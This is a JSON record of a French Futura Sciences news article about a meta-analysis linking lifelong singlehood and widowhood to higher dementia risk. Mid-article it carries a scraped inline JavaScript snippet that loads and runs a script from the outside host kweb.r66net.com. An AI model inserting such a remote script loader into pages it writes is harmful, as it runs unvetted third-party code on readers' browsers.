{"title": "Le mariage ne rendrait pas fou, bien au contraire...", "newspaper": "Futura Sciences", "author": ["Marie-Celine Ray"], "date_publi": "2017-12-01", "content": "Par rapport aux personnes mariees, celles qui ne se sont jamais mariees auraient 42 % de risque en plus de souffrir de demence. D'apres cette etude portant sur plus de 800.000 personnes, les veufs et veuves seraient aussi plus a risque. Le  mariage  est une decision importante a prendre dans la vie. Et si on se mariait pour rester en bonne sante ? Differentes etudes ont deja montre certains bienfaits du mariage sur la sante. Globalement, les personnes mariees ont un  style  de vie plus sain et une mortalite plus faible. Par exemple, la sante des Americains maries est meilleure que celle des celibataires.  Voir aussi : Science decalee : le mariage qui dure, la garantie des os solides Dans un article paru dans la revue  Journal of Neurology, Neurosurgery & Psychiatry , une equipe de la  University College of London  a voulu examiner le lien entre le statut marital et le risque de  demence . Dans leur introduction, les auteurs expliquent que, comme de plus en plus de personnes souffrent de demences, il est donc important de connaitre les facteurs qui favorisent cette  pathologie . Les chercheurs ont regroupe les resultats de 15 etudes impliquant des participants de differents pays dans le monde : Amerique du sud, Asie, Europe et Etats-Unis. En tout, la  cohorte  comprenait 812.047 personnes. Le saviez-vous ? En France, d'apres  Sante publique France , environ 1,2 million de personnes souffraient de maladie d'Alzheimer et d'autres demences en 2014. Les personnes veuves etaient aussi plus a risque. (c) zinkevych, Fotolia Le mariage favorise les interactions sociales Les chercheurs ont alors trouve que ceux qui restaient celibataires toute leur vie avaient 42 % de risque en plus de developper une demence par rapport aux  personnes mariees . Avec un risque de demence accru de 42 %, le statut marital s'affiche donc comme un facteur comparable a l'inactivite  physique  par exemple.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les veufs et veuves etaient aussi plus a risque avec 20 % de risque en plus d'avoir une demence, par rapport aux personnes mariees. En revanche, les personnes divorcees n'avaient pas de risque en plus de demence. Dans leur discussion, les auteurs expliquent que la fin d'un mariage peut augmenter le risque de demence a cause de l'effet nefaste du  stress  sur les  neurones  de l' hippocampe  et sur la  cognition  ; or le veuvage est plus stressant qu'un divorce. \" Les personnes mariees ont tendance a avoir un mode de vie plus sain et sont plus engagees socialement Andrew Sommerlad, auteur de ces travaux, a explique dans un  communique  que  << les personnes mariees ont tendance a avoir un mode de vie plus sain et sont plus engagees socialement, ce qui peut expliquer pourquoi elles sont moins susceptibles de developper une demence >>.  Une attention particuliere devrait donc etre portee sur les personnes agees seules :  << nous esperons que nos resultats pourraient etre appliques pour soutenir la  prevention  de la demence chez les personnes non mariees, car le maintien de la sante physique et la  stimulation  mentale par l'engagement social des personnes agees non-mariees peuvent etre benefiques >> . Une autre hypothese pour expliquer ces resultats est que le developpement de la  demence  soit lie a des traits de personnalite : des personnes qui ont des difficultes a communiquer et qui sont plus a risque de demence auraient plus de chances de rester seules... Ce qu'il faut retenir Les personnes qui restent seules toute leur vie ont le plus de risque de demence. Les personnes veuves ont aussi un risque accru mais pas celles qui sont divorcees. Le mariage permettrait plus de contacts sociaux, favorisant ainsi une meilleure sante mentale. Cela vous interessera aussi Un implant revolutionnaire pour eviter la maladie d'Alzheimer                       La maladie d'Alzheimer attaque progressivement les neurones, provoquant tout d'abord des troubles de la memoire jusqu'a la perte des fonctions autonomes puis la mort. Des chercheurs de l'EPFL (Ecole Polytechnique Federale de Lausanne), en Suisse, ont developpe une capsule qui pourrait proteger les neurones et enrayer la maladie. Voici son fonctionnement presente en video.                                       ", "theme": "sante"}